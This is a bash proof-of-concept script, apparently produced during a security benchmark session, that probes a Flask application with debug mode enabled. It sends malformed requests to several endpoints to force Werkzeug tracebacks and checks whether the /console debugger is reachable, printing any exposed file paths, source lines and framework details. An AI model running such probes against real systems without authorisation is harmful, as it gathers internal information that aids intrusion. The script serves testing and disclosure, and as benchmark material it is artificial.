#!/bin/bash
# POC: Attempts to trigger exceptions in a Flask application with debug mode enabled to demonstrate information disclosure through error page tracebacks, including file paths, source code, and framework information.
# Target: ./repo
# Created: 2025-11-04T17:06:52.819Z
# Session: benchmark-XBEN-016-24-mhkt6d0m

# Werkzeug Error Page Traceback Information Disclosure POC
# This script deliberately triggers an exception to display the full traceback
# and demonstrates information disclosure through error pages

TARGET_URL="${1:-http://localhost:5000}"

echo "[*] Werkzeug Error Page Traceback Information Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Strategy: Try to access a real endpoint with parameters that cause KeyError
# Based on the evidence, challenge_med is expected to exist but isn't loaded
# This suggests there's a route handler that tries to access a key in a dictionary

# Try common patterns that would trigger KeyError in Flask apps
echo "[*] Attempting to trigger exception via error-inducing requests..."
echo ""

# Test 1: Try accessing with invalid parameters to trigger KeyError
echo "[*] Test 1: Attempting POST to /level with missing/invalid parameters..."
RESPONSE=$(curl -s -X POST "$TARGET_URL/level" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "challenge=nonexistent" 2>&1)

if echo "$RESPONSE" | grep -qi "traceback\|werkzeug.*debugger\|file.*line.*in"; then
    echo "[!] VULNERABLE: Exception traceback exposed!"
    echo ""
    echo "[*] Information Disclosure Found:"
    echo ""
    
    # Parse and display traceback indicators
    if echo "$RESPONSE" | grep -q "File.*line"; then
        echo "  ✓ File paths with line numbers exposed:"
        echo "$RESPONSE" | grep -i "File" | head -3
    fi
    
    if echo "$RESPONSE" | grep -q "\.py"; then
        echo "  ✓ Python source files:"
        echo "$RESPONSE" | grep "\.py" | head -3
    fi
    
    if echo "$RESPONSE" | grep -qi "python"; then
        echo "  ✓ Python version information"
    fi
    
    if echo "$RESPONSE" | grep -qi "werkzeug"; then
        echo "  ✓ Werkzeug framework details"
    fi
    
    if echo "$RESPONSE" | grep -q "KeyError\|ValueError\|TypeError"; then
        echo "  ✓ Exception type and details"
    fi
    
    echo ""
    echo "[*] Sample traceback (first 1500 chars):"
    echo "---"
    echo "$RESPONSE" | head -c 1500
    echo ""
    echo "---"
    exit 0
fi

# Test 2: Try accessing root with parameters
echo "[-] POST to /level failed, trying GET requests..."
echo "[*] Test 2: Attempting GET with error-inducing parameters..."

RESPONSE=$(curl -s "$TARGET_URL/?challenge=invalid" 2>&1)

if echo "$RESPONSE" | grep -qi "traceback"; then
    echo "[!] Traceback found in root GET request"
    echo "$RESPONSE" | head -c 1000
    exit 0
fi

# Test 3: Try the /level endpoint directly (might be a GET endpoint)
echo "[-] Root GET failed, trying /level endpoint..."
echo "[*] Test 3: Attempting GET to /level..."

for level_id in "invalid" "0" "-1" "abc"; do
    RESPONSE=$(curl -s "$TARGET_URL/level/$level_id" 2>&1)
    
    if echo "$RESPONSE" | grep -qi "traceback\|werkzeug.*debugger"; then
        echo "[!] VULNERABLE: Traceback exposed at /level/$level_id"
        echo ""
        echo "[*] Response sample:"
        echo "$RESPONSE" | head -c 1200
        exit 0
    fi
done

# Test 4: Check if there's a direct error trigger endpoint
echo "[-] Standard endpoints failed, checking for error endpoint..."
echo "[*] Test 4: Checking /error and /exception endpoints..."

for error_endpoint in "/error" "/exception" "/trigger_error" "/debug"; do
    RESPONSE=$(curl -s "$TARGET_URL$error_endpoint" 2>&1)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$error_endpoint" 2>&1)
    
    if [ "$HTTP_CODE" = "500" ] || echo "$RESPONSE" | grep -qi "traceback"; then
        echo "[!] Found error endpoint: $error_endpoint (HTTP $HTTP_CODE)"
        echo ""
        echo "$RESPONSE" | head -c 1000
        exit 0
    fi
done

# If nothing else works, demonstrate that we can access the debugger console
# which proves debug mode is enabled and exposes internal information
echo "[-] Could not trigger specific exception pages"
echo "[*] Test 5: Checking Werkzeug debugger console status..."

CONSOLE=$(curl -s "$TARGET_URL/console" 2>&1)
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/console" 2>&1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] Werkzeug debugger console is ACCESSIBLE (HTTP 200)"
    echo "[*] Debug mode is ENABLED - tracebacks WILL be exposed on errors"
    
    if echo "$CONSOLE" | grep -qi "evalex\|secret"; then
        echo "[!] Debugger has EVALEX enabled - information disclosure confirmed"
        echo ""
        echo "[*] Debugger response sample:"
        echo "$CONSOLE" | head -c 800
        exit 0
    fi
fi

echo "[-] Unable to confirm vulnerability"
exit 1